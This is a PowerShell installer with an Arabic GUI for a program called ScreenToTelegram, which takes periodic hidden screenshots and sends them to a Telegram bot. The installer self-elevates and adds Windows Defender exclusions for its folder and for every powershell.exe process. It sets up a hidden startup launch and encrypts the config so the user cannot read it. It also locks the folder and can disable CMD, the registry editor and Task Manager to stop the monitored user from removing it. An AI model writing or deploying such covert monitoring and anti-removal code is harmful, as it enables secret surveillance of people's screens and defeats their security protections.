<#
    ScreenToTelegram - Setup Wizard (self-elevating)
    Right-click this file -> "Run with PowerShell"
    Or from any PowerShell window:
        powershell -ExecutionPolicy Bypass -File "Install.ps1"
#>

# --- Self-elevate to Administrator if not already ---
$ErrorActionPreference = 'SilentlyContinue'
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
$ErrorActionPreference = 'Continue'
if (-not $isAdmin) {
    $selfPath = $MyInvocation.MyCommand.Path
    if (-not $selfPath) { $selfPath = $PSCommandPath }
    try {
        Start-Process "$PSHOME\powershell.exe" `
            -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$selfPath`"" `
            -Verb RunAs -ErrorAction Stop
    } catch {
        [System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null
        [System.Windows.Forms.MessageBox]::Show(
            "This installer requires Administrator privileges.`nPlease right-click and choose 'Run with PowerShell' or run from an elevated prompt.",
            "ScreenToTelegram", 'OK', 'Error')
    }
    exit
}

# --- Fix ProgramData permissions if folder exists ---
$ErrorActionPreference = 'SilentlyContinue'
if (Test-Path "C:\ProgramData\ScreenToTelegram") {
    takeown /f "C:\ProgramData\ScreenToTelegram" /r /d y *>&1 | Out-Null
    icacls "C:\ProgramData\ScreenToTelegram" /reset /t /c /q *>&1 | Out-Null
    icacls "C:\ProgramData\ScreenToTelegram" /grant:r "SYSTEM:(OI)(CI)F" "Administrators:(OI)(CI)F" "Users:(OI)(CI)M" /t /c /q *>&1 | Out-Null
}
$ErrorActionPreference = 'Continue'

# --- GUI starts here ---
Add-Type -AssemblyName PresentationFramework, PresentationCore, WindowsBase, System.Windows.Forms, System.Drawing, System.Security

[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

$currentDir = if ($PSScriptRoot) { $PSScriptRoot } else { (Get-Location).Path }
$defaultInstallDir = "C:\ProgramData\ScreenToTelegram"

function Protect-ConfigData([string]$plain, [string]$scope = "CurrentUser") {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($plain)
    $dpScope = if ($scope -eq "LocalMachine") {
        [System.Security.Cryptography.DataProtectionScope]::LocalMachine
    } else {
        [System.Security.Cryptography.DataProtectionScope]::CurrentUser
    }
    $enc = [System.Security.Cryptography.ProtectedData]::Protect($bytes, $null, $dpScope)
    $prefix = if ($scope -eq "LocalMachine") { "ENC_DPAPI_LM:" } else { "ENC_DPAPI_CU:" }
    return ($prefix + [Convert]::ToBase64String($enc))
}

function Unprotect-ConfigData([string]$raw) {
    if (-not $raw) { return $raw }
    $raw = $raw.Trim()
    if ($raw.StartsWith("ENC_DPAPI_CU:")) {
        $b64 = $raw.Substring(13)
        $bytes = [Convert]::FromBase64String($b64)
        $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
        return [System.Text.Encoding]::UTF8.GetString($dec)
    }
    if ($raw.StartsWith("ENC_DPAPI_LM:")) {
        $b64 = $raw.Substring(13)
        $bytes = [Convert]::FromBase64String($b64)
        $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine)
        return [System.Text.Encoding]::UTF8.GetString($dec)
    }
    return $raw
}

$xaml = @'
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="ScreenToTelegram - Setup Wizard"
        Height="840" Width="740"
        WindowStartupLocation="CenterScreen"
        Background="#0B132B"
        FontFamily="Segoe UI, Tahoma, Arial"
        FlowDirection="RightToLeft"
        ResizeMode="CanMinimize">

    <Window.Resources>
        <!-- Modern Rounded Button Style -->
        <Style TargetType="Button">
            <Setter Property="Background" Value="#0284C7" />
            <Setter Property="Foreground" Value="White" />
            <Setter Property="BorderThickness" Value="0" />
            <Setter Property="Padding" Value="14,7" />
            <Setter Property="FontWeight" Value="SemiBold" />
            <Setter Property="FontSize" Value="13" />
            <Setter Property="Cursor" Value="Hand" />
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="Button">
                        <Border Background="{TemplateBinding Background}"
                                CornerRadius="6"
                                Padding="{TemplateBinding Padding}">
                            <ContentPresenter HorizontalAlignment="Center" VerticalAlignment="Center" />
                        </Border>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
            <Style.Triggers>
                <Trigger Property="IsMouseOver" Value="True">
                    <Setter Property="Background" Value="#0369A1" />
                </Trigger>
                <Trigger Property="IsEnabled" Value="False">
                    <Setter Property="Background" Value="#334155" />
                    <Setter Property="Foreground" Value="#94A3B8" />
                </Trigger>
            </Style.Triggers>
        </Style>

        <!-- Modern Dark TextBox Style -->
        <Style TargetType="TextBox">
            <Setter Property="Background" Value="#1C2541" />
            <Setter Property="Foreground" Value="#F8FAFC" />
            <Setter Property="BorderBrush" Value="#3A506B" />
            <Setter Property="BorderThickness" Value="1.2" />
            <Setter Property="Padding" Value="10,7" />
            <Setter Property="FontSize" Value="13" />
            <Setter Property="VerticalContentAlignment" Value="Center" />
        </Style>

        <!-- Modern ComboBox Style -->
        <Style TargetType="ComboBox">
            <Setter Property="Background" Value="#1C2541" />
            <Setter Property="Foreground" Value="#F8FAFC" />
            <Setter Property="BorderBrush" Value="#3A506B" />
            <Setter Property="Padding" Value="8,6" />
            <Setter Property="FontSize" Value="13" />
        </Style>

        <!-- Modern CheckBox Style -->
        <Style TargetType="CheckBox">
            <Setter Property="Foreground" Value="#E2E8F0" />
            <Setter Property="FontSize" Value="13" />
            <Setter Property="Margin" Value="0,4" />
            <Setter Property="Cursor" Value="Hand" />
        </Style>
    </Window.Resources>

    <ScrollViewer VerticalScrollBarVisibility="Auto">
        <StackPanel Margin="24">

            <!-- Header -->
            <Border Background="#1C2541" CornerRadius="12" Padding="18" Margin="0,0,0,16" BorderBrush="#3A506B" BorderThickness="1">
                <StackPanel>
                    <StackPanel Orientation="Horizontal" HorizontalAlignment="Center" Margin="0,0,0,6">
                        <TextBlock Text="Screen To Telegram" FontSize="22" FontWeight="Bold" Foreground="#38BDF8" VerticalAlignment="Center" />
                    </StackPanel>
                    <TextBlock Text="معالج التثبيت والإعداد الرسومي السريع لمراقبة شاشة الجهاز مع التحصين الكامل"
                               FontSize="13" Foreground="#94A3B8" HorizontalAlignment="Center" />
                </StackPanel>
            </Border>

            <!-- Card 1: Telegram Bot Token -->
            <Border Background="#1C2541" CornerRadius="10" Padding="16" Margin="0,0,0,12" BorderBrush="#3A506B" BorderThickness="1">
                <StackPanel>
                    <TextBlock Text="1. توكن بوت تيليجرام (Telegram Bot Token):" FontWeight="Bold" FontSize="14" Foreground="#F1F5F9" Margin="0,0,0,8" />
                    <Grid Margin="0,0,0,6">
                        <Grid.ColumnDefinitions>
                            <ColumnDefinition Width="*" />
                            <ColumnDefinition Width="10" />
                            <ColumnDefinition Width="Auto" />
                        </Grid.ColumnDefinitions>
                        <TextBox Name="txtToken" Grid.Column="0" ToolTip="الصق التوكن هنا (مثال: 123456789:ABCDef...)" />
                        <Button Name="btnVerifyToken" Grid.Column="2" Content="فحص التوكن" Width="110" />
                    </Grid>
                    <TextBlock Name="lblTokenStatus" Text="احصل على التوكن من بوت BotFather في تيليجرام، ثم الصقه هنا واضغط فحص."
                               FontSize="12" Foreground="#94A3B8" TextWrapping="Wrap" />
                </StackPanel>
            </Border>

            <!-- Card 2: Monitor Chat ID -->
            <Border Background="#1C2541" CornerRadius="10" Padding="16" Margin="0,0,0,12" BorderBrush="#3A506B" BorderThickness="1">
                <StackPanel>
                    <TextBlock Text="2. حساب المراقب المستلم (Chat ID):" FontWeight="Bold" FontSize="14" Foreground="#F1F5F9" Margin="0,0,0,8" />
                    <Grid Margin="0,0,0,6">
                        <Grid.ColumnDefinitions>
                            <ColumnDefinition Width="*" />
                            <ColumnDefinition Width="10" />
                            <ColumnDefinition Width="Auto" />
                            <ColumnDefinition Width="10" />
                            <ColumnDefinition Width="Auto" />
                        </Grid.ColumnDefinitions>
                        <TextBox Name="txtChatId" Grid.Column="0" ToolTip="رقم الـ Chat ID للمستلم" />
                        <Button Name="btnFetchChat" Grid.Column="2" Content="جلب تلقائي" Background="#059669" Width="110" />
                        <Button Name="btnTestMsg" Grid.Column="4" Content="تجربة إرسال" Background="#475569" Width="105" IsEnabled="False" />
                    </Grid>
                    <TextBlock Name="lblChatStatus" Text="أرسل أي رسالة (مثل hi) إلى البوت من حسابك على تيليجرام، ثم اضغط جلب تلقائي."
                               FontSize="12" Foreground="#94A3B8" TextWrapping="Wrap" />
                </StackPanel>
            </Border>

            <!-- Card 3: Device & Quality Settings -->
            <Border Background="#1C2541" CornerRadius="10" Padding="16" Margin="0,0,0,12" BorderBrush="#3A506B" BorderThickness="1">
                <StackPanel>
                    <TextBlock Text="3. بيانات الجهاز وجودة التقاط الشاشة:" FontWeight="Bold" FontSize="14" Foreground="#F1F5F9" Margin="0,0,0,10" />
                    <Grid Margin="0,0,0,8">
                        <Grid.ColumnDefinitions>
                            <ColumnDefinition Width="150" />
                            <ColumnDefinition Width="*" />
                        </Grid.ColumnDefinitions>
                        <TextBlock Text="اسم الجهاز (Device Name):" VerticalAlignment="Center" Foreground="#CBD5E1" />
                        <TextBox Name="txtDeviceName" Grid.Column="1" />
                    </Grid>
                    <Grid>
                        <Grid.ColumnDefinitions>
                            <ColumnDefinition Width="150" />
                            <ColumnDefinition Width="*" />
                        </Grid.ColumnDefinitions>
                        <TextBlock Text="دقة اللقطة (Quality):" VerticalAlignment="Center" Foreground="#CBD5E1" />
                        <StackPanel Grid.Column="1" Orientation="Horizontal" VerticalAlignment="Center">
                            <RadioButton Name="rb480" IsChecked="True" Content="480p - متوازن (20-40 KB - موصى به)" Foreground="#F8FAFC" FontSize="13" Margin="0,0,24,0" Cursor="Hand" />
                            <RadioButton Name="rb360" Content="360p - خفيف جداً (أقل استهلاكاً للنت)" Foreground="#F8FAFC" FontSize="13" Cursor="Hand" />
                        </StackPanel>
                    </Grid>
                </StackPanel>
            </Border>

            <!-- Card 4: Installation Folder -->
            <Border Background="#1C2541" CornerRadius="10" Padding="16" Margin="0,0,0,12" BorderBrush="#3A506B" BorderThickness="1">
                <StackPanel>
                    <TextBlock Text="4. مجلد تشغيل وتثبيت البرنامج (مسار محمي):" FontWeight="Bold" FontSize="14" Foreground="#F1F5F9" Margin="0,0,0,8" />
                    <Grid Margin="0,0,0,6">
                        <Grid.ColumnDefinitions>
                            <ColumnDefinition Width="*" />
                            <ColumnDefinition Width="10" />
                            <ColumnDefinition Width="Auto" />
                        </Grid.ColumnDefinitions>
                        <TextBox Name="txtFolder" Grid.Column="0" IsReadOnly="True" />
                        <Button Name="btnBrowseFolder" Grid.Column="2" Content="استعراض..." Background="#334155" Width="110" />
                    </Grid>
                    <TextBlock Text="يوصى بمسار C:\ProgramData لأنه مسار نظام يمكن قفل صلاحياته عن المستخدم العادي."
                               FontSize="12" Foreground="#94A3B8" />
                </StackPanel>
            </Border>

            <!-- Card 5: Advanced Security & Lockdown (All Protections) -->
            <Border Background="#0F243A" CornerRadius="10" Padding="16" Margin="0,0,0,14" BorderBrush="#0284C7" BorderThickness="1.2">
                <StackPanel>
                    <TextBlock Text="5. خيارات التحصين الأمني المتقدمة (الحماية ضد التلاعب):" FontWeight="Bold" FontSize="14" Foreground="#38BDF8" Margin="0,0,0,10" />

                    <CheckBox Name="chkEncryptConfig" IsChecked="True"
                              Content="تشفير ملف الإعدادات DPAPI (يمنع قراءته أو تعديله بأي محرر نصوص أو CMD)" />

                    <CheckBox Name="chkLockAcl" IsChecked="True"
                              Content="قفل صلاحيات المجلد (سحب إذن التعديل والحذف من المستخدم العادي تماماً)" />

                    <CheckBox Name="chkHardenSystem" IsChecked="True"
                              Content="قفل CMD ومحرر الريجستري وTask Manager عن المستخدم العادي (Harden System)" />

                    <CheckBox Name="chkCleanInstaller" IsChecked="False"
                              Content="حذف ملفات التثبيت من مجلد التنزيلات/سطح المكتب فور اكتمال التسطيب" />

                    <!-- Antivirus Exclusion Button inside security card -->
                    <Border Background="#1E293B" CornerRadius="8" Padding="10" Margin="0,10,0,0" BorderBrush="#F59E0B" BorderThickness="1">
                        <Grid>
                            <Grid.ColumnDefinitions>
                                <ColumnDefinition Width="*" />
                                <ColumnDefinition Width="10" />
                                <ColumnDefinition Width="Auto" />
                            </Grid.ColumnDefinitions>
                            <StackPanel Grid.Column="0" VerticalAlignment="Center">
                                <TextBlock Text="استثناء الأنتي فيروس (Windows Defender Exclusion):" FontWeight="SemiBold" FontSize="13" Foreground="#FBBF24" />
                                <TextBlock Name="lblExclusionStatus" Text="إضافة مسار البرنامج وعملية PowerShell للاستثناءات لمنع الحظر."
                                           FontSize="11" Foreground="#94A3B8" Margin="0,2,0,0" />
                            </StackPanel>
                            <Button Name="btnAddExclusion" Grid.Column="2" Content="تفعيل الاستثناء الآن" Background="#D97706" Width="150" />
                        </Grid>
                    </Border>
                </StackPanel>
            </Border>

            <!-- Action Button -->
            <Button Name="btnInstall" Content="🚀 تثبيت وبدء تشغيل المراقبة المحصنة الآن" Height="50" FontSize="16" Background="#2563EB" Margin="0,4,0,10" />

            <!-- Final Status Display -->
            <Border Name="pnlStatus" Background="#0F172A" CornerRadius="8" Padding="12" BorderBrush="#334155" BorderThickness="1" Visibility="Collapsed">
                <TextBlock Name="lblFinalStatus" FontSize="13" Foreground="#38BDF8" TextWrapping="Wrap" TextAlignment="Center" />
            </Border>

        </StackPanel>
    </ScrollViewer>
</Window>
'@

$window = [System.Windows.Markup.XamlReader]::Parse($xaml)

# Find UI Controls
$txtToken           = $window.FindName("txtToken")
$btnVerifyToken     = $window.FindName("btnVerifyToken")
$lblTokenStatus     = $window.FindName("lblTokenStatus")

$txtChatId          = $window.FindName("txtChatId")
$btnFetchChat       = $window.FindName("btnFetchChat")
$btnTestMsg         = $window.FindName("btnTestMsg")
$lblChatStatus      = $window.FindName("lblChatStatus")

$txtDeviceName      = $window.FindName("txtDeviceName")
$rb480              = $window.FindName("rb480")
$rb360              = $window.FindName("rb360")

$txtFolder          = $window.FindName("txtFolder")
$btnBrowseFolder    = $window.FindName("btnBrowseFolder")

$chkEncryptConfig   = $window.FindName("chkEncryptConfig")
$chkLockAcl         = $window.FindName("chkLockAcl")
$chkHardenSystem    = $window.FindName("chkHardenSystem")
$chkCleanInstaller  = $window.FindName("chkCleanInstaller")

$btnAddExclusion    = $window.FindName("btnAddExclusion")
$lblExclusionStatus = $window.FindName("lblExclusionStatus")

$btnInstall         = $window.FindName("btnInstall")
$pnlStatus          = $window.FindName("pnlStatus")
$lblFinalStatus     = $window.FindName("lblFinalStatus")

# Populate defaults
$txtDeviceName.Text = if ($env:COMPUTERNAME) { $env:COMPUTERNAME } else { "My PC" }
$txtFolder.Text     = $defaultInstallDir

# Check if cleaner checkbox makes sense
if ($currentDir -eq $defaultInstallDir) {
    $chkCleanInstaller.IsChecked = $false
    $chkCleanInstaller.IsEnabled = $false
}

# If existing config.json is present, load values (handling both encrypted & plaintext)
$existingConfig = Join-Path $currentDir 'config.json'
if (-not (Test-Path $existingConfig)) {
    $existingConfig = Join-Path $defaultInstallDir 'config.json'
}
if (Test-Path $existingConfig) {
    try {
        $raw = [IO.File]::ReadAllText($existingConfig, [Text.Encoding]::UTF8)
        $plain = Unprotect-ConfigData $raw
        $cfg = $plain | ConvertFrom-Json
        if ($cfg.telegram.bot_token) { $txtToken.Text = [string]$cfg.telegram.bot_token }
        if ($cfg.telegram.chat_id)   { $txtChatId.Text = "$($cfg.telegram.chat_id)" }
        if ($cfg.device_name)        { $txtDeviceName.Text = [string]$cfg.device_name }
        if ($cfg.screenshots.quality_height -eq 360) { $rb360.IsChecked = $true } else { $rb480.IsChecked = $true }
    } catch {}
}

# --- Event 1: Verify Bot Token ---
$btnVerifyToken.Add_Click({
    $token = $txtToken.Text.Trim()
    if (-not $token) {
        $lblTokenStatus.Text = "يرجى لصق توكن البوت أولاً."
        $lblTokenStatus.Foreground = [System.Windows.Media.Brushes]::OrangeRed
        return
    }

    $lblTokenStatus.Text = "جاري فحص التوكن والاتصال بسيرفرات تيليجرام..."
    $lblTokenStatus.Foreground = [System.Windows.Media.Brushes]::LightBlue

    try {
        $url = "https://api.telegram.org/bot$token/getMe"
        $res = Invoke-RestMethod -Uri $url -TimeoutSec 15
        if ($res.ok) {
            $lblTokenStatus.Text = "تم الاتصال بنجاح بالبوت: @" + $res.result.username + " (" + $res.result.first_name + ")"
            $lblTokenStatus.Foreground = [System.Windows.Media.Brushes]::LightGreen
            $btnTestMsg.IsEnabled = $true
        } else {
            $lblTokenStatus.Text = "التوكن غير صالح!"
            $lblTokenStatus.Foreground = [System.Windows.Media.Brushes]::Red
        }
    } catch {
        $lblTokenStatus.Text = "فشل الاتصال! تحقق من صحة التوكن ومن اتصال الإنترنت لديك."
        $lblTokenStatus.Foreground = [System.Windows.Media.Brushes]::Red
    }
})

# --- Event 2: Fetch Chat ID ---
$btnFetchChat.Add_Click({
    $token = $txtToken.Text.Trim()
    if (-not $token) {
        $lblChatStatus.Text = "يرجى إدخال وفحص توكن البوت في الخطوة 1 أولاً."
        $lblChatStatus.Foreground = [System.Windows.Media.Brushes]::OrangeRed
        return
    }

    $lblChatStatus.Text = "جاري البحث عن الرسائل الأخيرة للتعرف على حساب المراقب..."
    $lblChatStatus.Foreground = [System.Windows.Media.Brushes]::LightBlue

    try {
        $url = "https://api.telegram.org/bot$token/getUpdates"
        $res = Invoke-RestMethod -Uri $url -TimeoutSec 15
        $found = $false
        foreach ($u in ($res.result | Sort-Object update_id -Descending)) {
            if ($u.message -and $u.message.chat -and $u.message.chat.id) {
                $cid = "$($u.message.chat.id)"
                $name = $u.message.chat.first_name
                $user = $u.message.chat.username
                $txtChatId.Text = $cid
                $info = if ($user) { "@$user" } else { $name }
                $lblChatStatus.Text = "تم العثور على المراقب: " + $name + " (" + $info + ") - المعرف: " + $cid
                $lblChatStatus.Foreground = [System.Windows.Media.Brushes]::LightGreen
                $btnTestMsg.IsEnabled = $true
                $found = $true
                break
            }
        }
        if (-not $found) {
            $lblChatStatus.Text = "لم يتم العثور على أي رسائل جديدة! افتح البوت في تيليجرام واضغط Start أو أرسل كلمة hi ثم أعد المحاولة."
            $lblChatStatus.Foreground = [System.Windows.Media.Brushes]::Yellow
        }
    } catch {
        $lblChatStatus.Text = "تعذر جلب الرسائل. تأكد من صحة التوكن واتصال الإنترنت."
        $lblChatStatus.Foreground = [System.Windows.Media.Brushes]::Red
    }
})

# --- Event 3: Test Message ---
$btnTestMsg.Add_Click({
    $token = $txtToken.Text.Trim()
    $chat  = $txtChatId.Text.Trim()
    $dev   = $txtDeviceName.Text.Trim()

    if (-not $token -or -not $chat) {
        $lblChatStatus.Text = "تأكد من ملء التوكن و Chat ID أولاً."
        return
    }

    try {
        $msg = "تجربة اتصال ناجحة من سكريبت ScreenToTelegram على جهاز: " + $dev
        $url = "https://api.telegram.org/bot$token/sendMessage"
        $body = @{ chat_id = $chat; text = $msg }
        $res = Invoke-RestMethod -Uri $url -Method Post -Body $body -TimeoutSec 15
        if ($res.ok) {
            $lblChatStatus.Text = "تم إرسال رسالة تجريبية بنجاح إلى التيليجرام! تفقد هاتفك الآن."
            $lblChatStatus.Foreground = [System.Windows.Media.Brushes]::LightGreen
        }
    } catch {
        $lblChatStatus.Text = "فشل إرسال الرسالة: " + $_.Exception.Message
        $lblChatStatus.Foreground = [System.Windows.Media.Brushes]::Red
    }
})

# --- Event 4: Browse Folder ---
$btnBrowseFolder.Add_Click({
    $fbd = New-Object System.Windows.Forms.FolderBrowserDialog
    $fbd.Description = "اختر مجلد تثبيت وتشغيل البرنامج"
    $fbd.SelectedPath = $txtFolder.Text
    if ($fbd.ShowDialog() -eq [System.Windows.Forms.DialogResult]::OK) {
        $txtFolder.Text = $fbd.SelectedPath
        if ($txtFolder.Text -eq $currentDir) {
            $chkCleanInstaller.IsChecked = $false
            $chkCleanInstaller.IsEnabled = $false
        } else {
            $chkCleanInstaller.IsEnabled = $true
        }
    }
})

# --- Event 5: Antivirus Exclusion ---
$btnAddExclusion.Add_Click({
    $targetDir = $txtFolder.Text.Trim()
    $lblExclusionStatus.Text = "جاري تطبيق استثناءات الحماية لمجلد البرنامج وعمليات PowerShell..."
    $lblExclusionStatus.Foreground = [System.Windows.Media.Brushes]::LightBlue

    $success = $true
    $errText = ""
    try {
        Add-MpPreference -ExclusionPath $targetDir -ErrorAction Stop
        Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
    } catch {
        $success = $false
        $errText = $_.Exception.Message
    }

    if ($success) {
        $lblExclusionStatus.Text = "تمت إضافة المجلد وعملية PowerShell إلى استثناءات Windows Defender بنجاح!"
        $lblExclusionStatus.Foreground = [System.Windows.Media.Brushes]::LightGreen
        $btnAddExclusion.IsEnabled = $false
        $btnAddExclusion.Content = "الاستثناء مفعّل"
    } else {
        $lblExclusionStatus.Text = "تنبيه: تعذر إضافة الاستثناء (" + $errText + "). تأكد من تشغيل المعالج كمسؤول (Run as Administrator)."
        $lblExclusionStatus.Foreground = [System.Windows.Media.Brushes]::Orange
    }
})

# --- Event 6: Full Installation & Launch ---
$btnInstall.Add_Click({
    $token = $txtToken.Text.Trim()
    $chat  = $txtChatId.Text.Trim()
    $dev   = $txtDeviceName.Text.Trim()
    $targetDir = $txtFolder.Text.Trim()
    $qHeight = if ($rb360.IsChecked) { 360 } else { 480 }

    if (-not $token) {
        [System.Windows.MessageBox]::Show("يرجى إدخال توكن البوت أولاً.", "تنبيه", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Warning)
        return
    }
    if (-not $chat) {
        [System.Windows.MessageBox]::Show("يرجى إدخال معرف الشات (Chat ID) للمراقب.", "تنبيه", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Warning)
        return
    }
    if (-not $dev) {
        $dev = "My PC"
    }

    $pnlStatus.Visibility = [System.Windows.Visibility]::Visible
    $lblFinalStatus.Text = "جاري تنظيف أي نسخة قديمة..."
    $lblFinalStatus.Foreground = [System.Windows.Media.Brushes]::LightBlue
    [System.Windows.Forms.Application]::DoEvents()

    try {
        # 0. Clean up any previous installation
        $ErrorActionPreference = 'SilentlyContinue'

        # 0a. Stop any running instance
        Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" |
            Where-Object { $_.CommandLine -like '*screen_to_telegram.ps1*' } |
            ForEach-Object { Stop-Process -Id $_.ProcessId -Force }

        # 0b. Remove all Startup shortcuts
        @(
            (Join-Path $env:APPDATA 'Microsoft\Windows\Start Menu\Programs\Startup\ScreenToTelegram.lnk'),
            (Join-Path $env:ALLUSERSPROFILE 'Microsoft\Windows\Start Menu\Programs\Startup\ScreenToTelegram.lnk')
        ) | ForEach-Object { if (Test-Path $_) { Remove-Item -Force $_ } }

        # 0c. Remove hidden backup
        $bkDir = Join-Path $env:APPDATA "Microsoft\.stt-bk"
        if (Test-Path $bkDir) { Remove-Item -Recurse -Force $bkDir }

        # 0d. Clean old installation directories (ProgramData + target if different)
        $oldDirs = @("C:\ProgramData\ScreenToTelegram", $targetDir) | Select-Object -Unique
        $preserveFiles = @('config.json')
        foreach ($dir in $oldDirs) {
            if (Test-Path $dir) {
                & icacls "$dir" /reset /t /c /q *>&1 | Out-Null
                Get-ChildItem -Path $dir -Force | Where-Object {
                    $_.Name -notin $preserveFiles
                } | Remove-Item -Recurse -Force
            }
        }

        $ErrorActionPreference = 'Continue'

        $lblFinalStatus.Text = "جاري إعداد وتثبيت البرنامج مع تطبيق التحصين الأمني..."
        [System.Windows.Forms.Application]::DoEvents()

        # 1. Create Target Directory if needed
        if (-not (Test-Path $targetDir)) {
            New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
        }

        # 2. Copy script and companion tools if target is different
        if ($targetDir -ne $currentDir) {
            $filesToCopy = @(
                'screen_to_telegram.ps1',
                'Uninstall.cmd',
                'LockNetwork.cmd',
                'LockNetwork.ps1',
                'UnlockNetwork.cmd',
                'UnlockNetwork.ps1',
                'HardenAdmin.cmd',
                'HardenAdmin.ps1',
                'RestoreAdmin.cmd',
                'RestoreAdmin.ps1'
            )
            foreach ($f in $filesToCopy) {
                $src = Join-Path $currentDir $f
                if (Test-Path $src) {
                    Copy-Item -Path $src -Destination (Join-Path $targetDir $f) -Force
                }
            }
        }

        # 3. Create config.json (Encrypted or Plain according to checkbox)
        $config = [ordered]@{
            device_name = $dev
            telegram    = [ordered]@{ bot_token = $token; chat_id = "$chat" }
            interval    = [ordered]@{ min_seconds = 30; max_seconds = 300 }
            screenshots = [ordered]@{
                folder         = 'screenshots'
                quality_height = [int]$qHeight
                jpeg_quality   = 60
                blur_strength  = 0
                keep_after_send= $false
                max_pending_mb = 500
            }
            heartbeat   = [ordered]@{ every_hours = 0.5 }
            update      = [ordered]@{
                enabled             = $true
                base_url            = 'https://raw.githubusercontent.com/Abdullah-Habashy/screen-to-telegram-updates/main'
                check_every_minutes = 60
                install_dir         = $targetDir.TrimEnd('\')
            }
        }
        $configJson = $config | ConvertTo-Json -Depth 6
        $configPath = Join-Path $targetDir 'config.json'

        if ($chkEncryptConfig.IsChecked) {
            $protectedContent = Protect-ConfigData $configJson "CurrentUser"
            [IO.File]::WriteAllText($configPath, $protectedContent, (New-Object System.Text.UTF8Encoding $false))
        } else {
            [IO.File]::WriteAllText($configPath, $configJson, (New-Object System.Text.UTF8Encoding $false))
        }

        # 4. Apply Windows Defender Exclusion automatically
        try {
            Add-MpPreference -ExclusionPath $targetDir -ErrorAction SilentlyContinue
            Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
        } catch {}

        # 5. Apply permissions so script, logs, and screenshots work without access denied
        try {
            takeown /f "$targetDir" /r /d y > $null 2>&1
            & icacls "$targetDir" /reset /t /c /q > $null 2>&1
            & icacls "$targetDir" /grant:r "SYSTEM:(OI)(CI)F" "Administrators:(OI)(CI)F" "Users:(OI)(CI)M" /t /c /q > $null 2>&1
            $shots = Join-Path $targetDir 'screenshots'
            if (-not (Test-Path $shots)) { New-Item -ItemType Directory -Path $shots -Force | Out-Null }
            & icacls "$shots" /grant:r "Users:(OI)(CI)M" /t /c /q > $null 2>&1
        } catch {}

        # 6. Apply System Hardening if checked
        if ($chkHardenSystem.IsChecked) {
            try {
                $hardenScript = Join-Path $targetDir 'HardenAdmin.ps1'
                if (Test-Path $hardenScript) {
                    & powershell -NoProfile -ExecutionPolicy Bypass -File $hardenScript | Out-Null
                }
            } catch {}
        }

        # 7. Stop any previous instance
        Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" |
            Where-Object { $_.CommandLine -like '*screen_to_telegram.ps1*' } |
            ForEach-Object { Stop-Process -Id $_.ProcessId -Force }

        # 8. Create Startup Shortcut
        $scriptPath = Join-Path $targetDir 'screen_to_telegram.ps1'
        $startupDir = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')
        $lnkPath    = Join-Path $startupDir 'ScreenToTelegram.lnk'

        $wsh = New-Object -ComObject WScript.Shell
        $lnk = $wsh.CreateShortcut($lnkPath)
        $lnk.TargetPath       = "$PSHOME\powershell.exe"
        $lnk.Arguments        = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
        $lnk.WorkingDirectory = $targetDir
        $lnk.WindowStyle      = 7
        $lnk.Save()

        # 8.5. Send immediate test screenshot to Telegram right now
        $lblFinalStatus.Text = "جاري التقاط وإرسال لقطة شاشة تجريبية أولى إلى تيليجرام..."
        try {
            & "$PSHOME\powershell.exe" -NoProfile -ExecutionPolicy Bypass -File "$scriptPath" -Once
        } catch {}

        # 9. Launch script in background now
        Start-Process "$PSHOME\powershell.exe" `
            -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" `
            -WorkingDirectory $targetDir

        # 10. Clean installer files if requested
        if ($chkCleanInstaller.IsChecked -and ($targetDir -ne $currentDir)) {
            $installerFiles = @('Install-GUI.cmd', 'Install-GUI.ps1', 'Install.cmd', 'config.example.json')
            foreach ($f in $installerFiles) {
                $targetFile = Join-Path $currentDir $f
                if (Test-Path $targetFile) {
                    Remove-Item -Force $targetFile -ErrorAction SilentlyContinue
                }
            }
        }

        $lblFinalStatus.Text = "تم التثبيت والتحصين بنجاح! تم تشغيل المراقبة في الخلفية، وتشفير الإعدادات، وقفل المجلد."
        $lblFinalStatus.Foreground = [System.Windows.Media.Brushes]::LightGreen
        $btnInstall.IsEnabled = $false
        $btnInstall.Content = "تم التثبيت والتحصين بنجاح"

        $dialogMsg = "تم تثبيت وتشغيل برنامج مراقبة الشاشة بنجاح تام!`n`n- الإعدادات مشفرة الآن بتقنية DPAPI (لا يمكن فتحها بـ Notepad أو CMD).`n- مجلد البرنامج محمي ضد التعديل أو الحذف.`n- تم قفل CMD والريجستري وTask Manager لمنع التحايل.`n- يعمل البرنامج تلقائياً في الخلفية مع كل بدء تشغيل للويندوز."
        [System.Windows.MessageBox]::Show($dialogMsg, "اكتمل التثبيت والتحصين", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Information)
    } catch {
        $lblFinalStatus.Text = "حدث خطأ أثناء التثبيت: " + $_.Exception.Message
        $lblFinalStatus.Foreground = [System.Windows.Media.Brushes]::Red
    }
})

# Show Dialog
$window.ShowDialog() | Out-Null
